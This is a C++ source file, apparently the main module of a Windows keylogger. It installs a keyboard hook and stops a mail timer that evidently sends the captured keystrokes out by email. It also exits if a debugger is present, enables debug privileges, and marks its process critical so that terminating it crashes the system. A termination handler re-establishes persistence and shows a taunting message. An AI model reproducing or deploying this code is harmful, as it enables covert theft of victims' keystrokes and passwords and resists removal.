#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"
#include <csignal>
//using namespace std;
BOOL EnablePriv(LPCSTR lpszPriv)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if(!LookupPrivilegeValue(NULL, lpszPriv, &luid)){
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

typedef long ( WINAPI *RtlSetProcessIsCritical ) (
        IN BOOLEAN    bNew,
        OUT BOOLEAN    *pbOld,
        IN BOOLEAN    bNeedScb );

void signalHandler(int signal) {
    if (signal == SIGTERM) {
        MessageBox(NULL, "You thought you could get away with this :) ", "Alert", MB_ICONINFORMATION | MB_OK);
        Socket_com_command::persist();
        exit(0);
    }
}

int main()
{

    if (IsDebuggerPresent())
    {
        printf("[+] Debugger Detected !");
        return 1;
    }
    signal(SIGTERM, signalHandler);
    EnablePriv(SE_DEBUG_NAME);

    HANDLE ntdll = LoadLibrary("ntdll.dll");
    RtlSetProcessIsCritical SetCriticalProcess;
    SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
    SetCriticalProcess(TRUE, NULL, FALSE);
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();

    while(GetMessage(&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);

    }
    MailTimer.Stop();
    return 0;
}
